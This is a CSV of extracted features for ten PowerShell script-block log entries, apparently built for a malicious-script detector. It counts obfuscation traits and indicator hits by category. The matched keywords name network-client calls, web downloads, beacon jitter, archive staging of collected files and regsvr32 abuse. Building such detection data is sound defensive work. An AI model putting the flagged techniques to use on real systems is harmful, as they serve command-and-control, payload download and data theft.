id,lexical_input_source,analysis_length,line_count,token_count,special_char_count,special_char_ratio,digit_ratio,whitespace_ratio,entropy,quoted_literal_count,short_literal_count,joined_literal_length,base64_candidate_count,longest_base64_candidate,decoded_view_count,backtick_count,concat_operator_count,join_operator_count,format_operator_count,char_cast_count,suspicious_mixed_case_count,suspicious_mixed_case_tokens,execution_hit_count,execution_hits,raw_execution_hit_count,recovered_execution_hit_count,decoded_execution_hit_count,download_hit_count,download_hits,raw_download_hit_count,recovered_download_hit_count,decoded_download_hit_count,network_c2_hit_count,network_c2_hits,raw_network_c2_hit_count,recovered_network_c2_hit_count,decoded_network_c2_hit_count,defense_evasion_hit_count,defense_evasion_hits,raw_defense_evasion_hit_count,recovered_defense_evasion_hit_count,decoded_defense_evasion_hit_count,persistence_hit_count,persistence_hits,raw_persistence_hit_count,recovered_persistence_hit_count,decoded_persistence_hit_count,credential_access_hit_count,credential_access_hits,raw_credential_access_hit_count,recovered_credential_access_hit_count,decoded_credential_access_hit_count,lolbin_hit_count,lolbin_hits,raw_lolbin_hit_count,recovered_lolbin_hit_count,decoded_lolbin_hit_count,collection_hit_count,collection_hits,raw_collection_hit_count,recovered_collection_hit_count,decoded_collection_hit_count,remote_execution_hit_count,remote_execution_hits,raw_remote_execution_hit_count,recovered_remote_execution_hit_count,decoded_remote_execution_hit_count,discovery_hit_count,discovery_hits,raw_discovery_hit_count,recovered_discovery_hit_count,decoded_discovery_hit_count,indicator_category_count,high_risk_category_count,raw_indicator_hit_count,indicator_hit_count,recovered_indicator_hit_count,decoded_indicator_hit_count
PST-001,windows_event_4104_scriptblocktext,284,1,31,94,0.330986,0.06338,0.03169,5.112692,12,8,175,0,0,0,0,0,1,0,0,1,Sockets.TcpC,0,,0,0,0,0,,0,0,0,2,getstream;tcpclient,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,2,2,0
PST-002,windows_event_4104_scriptblocktext,125,1,9,20,0.16,0.0,0.032,4.934428,1,0,57,1,26,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-003,windows_event_4104_scriptblocktext,260,1,34,94,0.361538,0.05,0.023077,5.01455,12,12,147,0,0,0,0,0,1,0,0,1,Invoke-WebR,0,,0,0,0,1,invoke-webrequest,0,1,0,1,jitter,0,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,0,2,2,0
PST-004,windows_event_4104_scriptblocktext,225,1,25,76,0.337778,0.0,0.04,4.93609,13,13,111,0,0,0,0,0,1,0,0,1,Get-ChildIte,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,collect.zip;compress-archive,0,2,0,0,,0,0,0,1,get-childitem,0,1,0,2,0,0,3,3,0
PST-005,windows_event_4104_scriptblocktext,131,1,19,48,0.366412,0.0,0.061069,4.847498,9,8,43,0,0,0,3,0,1,0,0,1,gEt-PrOc,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,0,1,0,1,0,0,1,1,0
PST-006,windows_event_4104_scriptblocktext,49,1,6,5,0.102041,0.020408,0.122449,4.126226,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-007,windows_event_4104_scriptblocktext,97,1,11,10,0.103093,0.020619,0.113402,4.631482,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-008,windows_event_4104_scriptblocktext,157,1,14,28,0.178344,0.012739,0.063694,5.132935,2,2,22,0,0,0,0,0,0,0,0,1,Get-FileHash,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-009,windows_event_4104_scriptblocktext,109,1,14,23,0.211009,0.018349,0.06422,4.734244,1,0,71,0,0,0,2,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,regsvr32,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-010,windows_event_4104_scriptblocktext,198,1,20,54,0.272727,0.0,0.131313,4.715514,10,10,111,0,0,0,0,9,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,collect.zip;compress-archive,1,1,0,0,,0,0,0,1,get-childitem,0,1,0,2,0,1,3,2,0
